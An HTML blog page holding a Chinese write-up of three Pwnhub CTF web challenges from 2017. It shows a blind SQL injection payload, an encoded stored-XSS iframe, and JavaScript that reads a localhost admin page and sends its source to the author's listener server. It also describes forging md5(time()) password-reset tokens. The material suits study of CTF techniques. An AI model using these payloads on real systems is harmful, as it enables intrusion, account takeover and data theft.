@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnhub杯几道题Writeup">
+<meta property="og:url" content="http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/05/3332961668.jpg">
+<meta property="og:updated_time" content="2017-08-20T00:55:33.265Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnhub杯几道题Writeup">
+<meta name="twitter:description" content="第一次认真地打比赛。 简陋的博客点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：http://54.223.247.98:8023/?a=article&amp;amp;page=1和http://54.223.247.98:8023/?a=article&amp;amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入">
+<meta name="twitter:image" content="http://120.25.80.195:7230/05/3332961668.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Pwnhub杯几道题Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/08/19/NSCTF 2017 Web部分 WriteUp/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/08/19/Mysql操作中的条件竞争漏洞/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&text=Pwnhub杯几道题Writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&is_video=false&description=Pwnhub杯几道题Writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwnhub杯几道题Writeup&body=Check out this article: http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&name=Pwnhub杯几道题Writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简陋的博客"><span class="toc-number">1.</span> <span class="toc-text">简陋的博客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-grasp-is-gold-catch-up-is-running-water"><span class="toc-number">2.</span> <span class="toc-text">Time, grasp is gold, catch up is running water.</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Pwnhub杯几道题Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homaebic-Know thyself</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-08-19T09:15:19.000Z" itemprop="datePublished">2017-08-19</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>第一次认真地打比赛。</p>
+<h3 id="简陋的博客"><a href="#简陋的博客" class="headerlink" title="简陋的博客"></a>简陋的博客</h3><p>点进题非常简洁，只有两个按钮，分别对应两篇文章。两个URL分别为 ：<a href="http://54.223.247.98:8023/?a=article&amp;page=1和http://54.223.247.98:8023/?a=article&amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入测试，进行一轮FUZZ之后牺牲惨烈，几乎所有的符号都被过滤了。这时候想到文章说的对POST也进行了过滤，那就试试把参数放到post中。测试下来发现a和page可以使用post传参，a参数只过滤了单引号，page参数如何测试都无法验证过滤了什么。" target="_blank" rel="external">http://54.223.247.98:8023/?a=article&amp;page=1和http://54.223.247.98:8023/?a=article&amp;page=2。第一篇文章中提到对GET、POST、REQUEST变量进行过滤。大致猜到可以注入。于是对Page参数进行注入测试，进行一轮FUZZ之后牺牲惨烈，几乎所有的符号都被过滤了。这时候想到文章说的对POST也进行了过滤，那就试试把参数放到post中。测试下来发现a和page可以使用post传参，a参数只过滤了单引号，page参数如何测试都无法验证过滤了什么。</a></p>
+<p><img src="http://120.25.80.195:7230/05/3332961668.jpg" alt="1.jpg"></p>
+<p>对a测试时，发现a是表名。表名是不可以被单引号包裹的，但表名可以被反引号包裹，本题也是如此。输入一个单引号就会报错。进行了一顿报错后，猜测查询语句为 select * from <code>sqli.输入点</code> where <code>id</code>=’输入点’。在报错信息中也发现page参数经过了intval()处理。</p>
+<p>还有一个点是在出字段名时，表名称需要单引号包裹，用16进制绕过。</p>
+<p>最后的payload：</p>
+<p>url：<code>http://54.223.247.98:8023/?&amp;page=1</code></p>
+<figure class="highlight plain"><figcaption><span>where id =1 and 1=if(ascii(substring((select column_name from information_schema.columns where table_name=0x666C61675F69735F68657265 limit 0,1),13,1))=115,1,2) union select * from `article```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">最终使用盲注，一位一位跑，返回页面的两种大小为布尔值，得到flag。`SYC&#123;O0o._O0o._O0o._O0o._O0o.&#125;`</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">### 中国菜刀</div><div class="line"></div><div class="line">这道题要分析菜刀后门。本来以为要逆出源码，小伙伴指点，抓包即可。于是在自己的服务器上放一个马，用下载的菜刀连上去，抓包。</div><div class="line"></div><div class="line">![2.jpg][2]</div><div class="line"></div><div class="line">对源码urlencode后base64_decode，出现一个网址http://118.89.225.190/shellbox.php?shell=，进入之后一片空白。最shell进行FUZZ，判断对XSS的某些payload过滤。因此判断这里是一个储存型XSS。</div><div class="line"></div><div class="line">构造payload：`&lt;IFRAME SRC=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&amp;#39;&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#104;&amp;#101;&amp;#98;&amp;#105;&amp;#99;&amp;#46;&amp;#109;&amp;#101;&amp;#47;&amp;#115;&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#47;&amp;#50;&amp;#46;&amp;#106;&amp;#115;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;&lt;/IFRAME&gt; `</div><div class="line"></div><div class="line">URL编码后访问，XSS平台收信。得到一个管理员页面shellbox_admin.php?id=2008 访问之依然是空白页面。对id进行各种测试都没有结果。此时有人提醒要看referer头。但是xss平台没有收到referer头，于是把xss payload变成一个img标签，指向监听的服务器。收到了referer头，http://127.0.0.1/shellbox_admin.php?id=2008 结合hint：flag在源码中，需要127.0.0.1访问shellbox_admin，并带出源码。</div><div class="line"></div><div class="line">```javascript</div><div class="line">    var target_url=&quot;http://127.0.0.1/shellbox_admin.php?id=2008&quot;;</div><div class="line">    var server_url=&quot;http://x.x.x.x:7231/&quot;;</div><div class="line">    var xmlhttp;</div><div class="line">    </div><div class="line">    function create_xmlhttp()</div><div class="line">    &#123;</div><div class="line">    	try&#123;</div><div class="line">    		xmlhttp=new XMLHttpRequest;</div><div class="line">    	&#125;catch(err)&#123;</div><div class="line">    		try&#123;</div><div class="line">    			xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">    		&#125;catch(err)&#123;</div><div class="line">    		&#125;</div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    create_xmlhttp();</div><div class="line">    </div><div class="line">    if(xmlhttp!=null)&#123;</div><div class="line">    	xmlhttp.onreadystatechange=state_change;</div><div class="line">    	xmlhttp.open(&quot;GET&quot;,target_url,true);</div><div class="line">    	xmlhttp.send(null);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function state_change()</div><div class="line">    &#123;</div><div class="line">    	if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;</div><div class="line">    		var s = new send_source(xmlhttp.responseText);</div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function send_source(source)</div><div class="line">    &#123;</div><div class="line">    	create_xmlhttp();</div><div class="line">    	var url = server_url+&quot;?source=&quot;+escape(source);</div><div class="line">    	xmlhttp.open(&quot;GET&quot;,url,false);</div><div class="line">    	xmlhttp.send(null);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>监听7231，得到源码。拿到flag <code>SYC{1_w0Nt_D0_1T_4gAin}</code></p>
+<h3 id="Time-grasp-is-gold-catch-up-is-running-water"><a href="#Time-grasp-is-gold-catch-up-is-running-water" class="headerlink" title="Time, grasp is gold, catch up is running water."></a>Time, grasp is gold, catch up is running water.</h3><p>P师傅说，50%的ctf题打开是个登录界面。</p>
+<p>进入题目一个登陆界面，有注册，登录，忘记密码几个功能。用普通用户登录后要求用管理员登录以继续做题。测试以后得到以下信息</p>
+<ol>
+<li><p>源码中有管理员邮箱</p>
+</li>
+<li><p>忘记密码之后可以在源码中得到一个用于重置密码的token</p>
+</li>
+<li><p>忘记管理员的密码不会得到一个token</p>
+</li>
+</ol>
+<p>所以思路就很明显了：利用普通用户重置密码找到token的规律，使用token重置管理员密码。</p>
+<p>token是md5(time())，在重置管理员密码的一瞬间执行一次，就得到一个token。</p>
+<p>另外，在重置密码界面提示ip在黑名单中。这里的规则是，每一个重置密码的地址只能使用一次，所以重置管理员密码的时候换一个没有使用过的ip地址即可。</p>
+<p>重置之后是用管理员进入后台。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简陋的博客"><span class="toc-number">1.</span> <span class="toc-text">简陋的博客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-grasp-is-gold-catch-up-is-running-water"><span class="toc-number">2.</span> <span class="toc-text">Time, grasp is gold, catch up is running water.</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&text=Pwnhub杯几道题Writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&is_video=false&description=Pwnhub杯几道题Writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwnhub杯几道题Writeup&body=Check out this article: http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&title=Pwnhub杯几道题Writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/Pwnhub杯几道题WriteUp/&name=Pwnhub杯几道题Writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Homaebic-Know thyself
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
